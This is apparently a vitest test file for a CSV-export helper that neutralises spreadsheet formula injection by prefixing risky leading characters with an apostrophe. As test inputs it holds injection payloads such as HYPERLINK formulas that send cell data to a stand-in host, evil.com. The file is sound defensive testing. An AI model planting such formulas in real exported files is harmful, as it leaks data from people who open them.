import { describe, it, expect } from 'vitest'
import Papa from 'papaparse'

// We test the sanitization logic by importing the internal helper indirectly:
// since `rowsToCsv` is not exported, we re-implement the sanitize helper here
// and test it directly, then verify the integration via the CSV string output
// from `rowsToCsv` once it's exported. For the purposes of TDD we export a
// `sanitizeCsvCell` helper from exportData.ts that we can test in isolation.
import { sanitizeCsvCell, rowsToCsv } from './exportData'

describe('sanitizeCsvCell', () => {
  // --- Formula-triggering leading characters ---
  it('prefixes = with apostrophe', () => {
    expect(sanitizeCsvCell('=HYPERLINK("https://evil.com","click")')).toBe(
      '\'=HYPERLINK("https://evil.com","click")',
    )
  })

  it('prefixes + with apostrophe', () => {
    expect(sanitizeCsvCell('+1+1')).toBe("'+1+1")
  })

  it('prefixes - with apostrophe', () => {
    expect(sanitizeCsvCell('-2')).toBe("'-2")
  })

  it('prefixes @ with apostrophe', () => {
    expect(sanitizeCsvCell('@SUM(A1)')).toBe("'@SUM(A1)")
  })

  it('prefixes tab-leading value with apostrophe', () => {
    expect(sanitizeCsvCell('\tfoo')).toBe("'\tfoo")
  })

  it('prefixes CR-leading value with apostrophe', () => {
    expect(sanitizeCsvCell('\rbar')).toBe("'\rbar")
  })

  it('prefixes LF-leading value with apostrophe', () => {
    expect(sanitizeCsvCell('\n=HYPERLINK("https://evil.com","x")')).toBe('\'\n=HYPERLINK("https://evil.com","x")')
  })

  // --- Safe values — must NOT be modified ---
  it('leaves ordinary text unchanged', () => {
    expect(sanitizeCsvCell('Hello world')).toBe('Hello world')
  })

  it('leaves numeric strings unchanged', () => {
    expect(sanitizeCsvCell('123 Main St')).toBe('123 Main St')
  })

  it('leaves a normal sentence unchanged', () => {
    const s = 'The bill passed by a wide margin.'
    expect(sanitizeCsvCell(s)).toBe(s)
  })

  it('leaves empty string unchanged', () => {
    expect(sanitizeCsvCell('')).toBe('')
  })

  it('does NOT escape = appearing mid-string', () => {
    expect(sanitizeCsvCell('a=b')).toBe('a=b')
  })

  it('does NOT escape + appearing mid-string', () => {
    expect(sanitizeCsvCell('email+tag@example.com')).toBe('email+tag@example.com')
  })

  it('leaves pure numbers (non-string) unchanged — passed as number', () => {
    // sanitizeCsvCell only operates on strings; numbers pass through
    expect(sanitizeCsvCell(42 as unknown as string)).toBe(42)
  })

  it('leaves null/undefined unchanged', () => {
    expect(sanitizeCsvCell(null as unknown as string)).toBeNull()
    expect(sanitizeCsvCell(undefined as unknown as string)).toBeUndefined()
  })
})

describe('rowsToCsv — formula injection integration', () => {
  it('sanitizes formula-starting cells in the CSV output', () => {
    const rows = [
      {
        name: 'Alice',
        comment: '=HYPERLINK("https://evil.com/?x="&A1,"click")',
        note: '+1+1',
      },
    ]
    const csv = rowsToCsv(rows)
    // Parse back with PapaParse to get the actual cell values
    const parsed = Papa.parse<Record<string, string>>(csv, { header: true })
    const row = parsed.data[0]
    expect(row.comment).toBe('\'=HYPERLINK("https://evil.com/?x="&A1,"click")')
    expect(row.note).toBe("'+1+1")
    // Safe value untouched
    expect(row.name).toBe('Alice')
  })

  it('leaves non-formula cells untouched end-to-end', () => {
    const rows = [{ id: '42', text: 'Normal text. Nothing suspicious here.', eq_mid: 'a=b' }]
    const csv = rowsToCsv(rows)
    const parsed = Papa.parse<Record<string, string>>(csv, { header: true })
    const row = parsed.data[0]
    expect(row.id).toBe('42')
    expect(row.text).toBe('Normal text. Nothing suspicious here.')
    expect(row.eq_mid).toBe('a=b')
  })
})
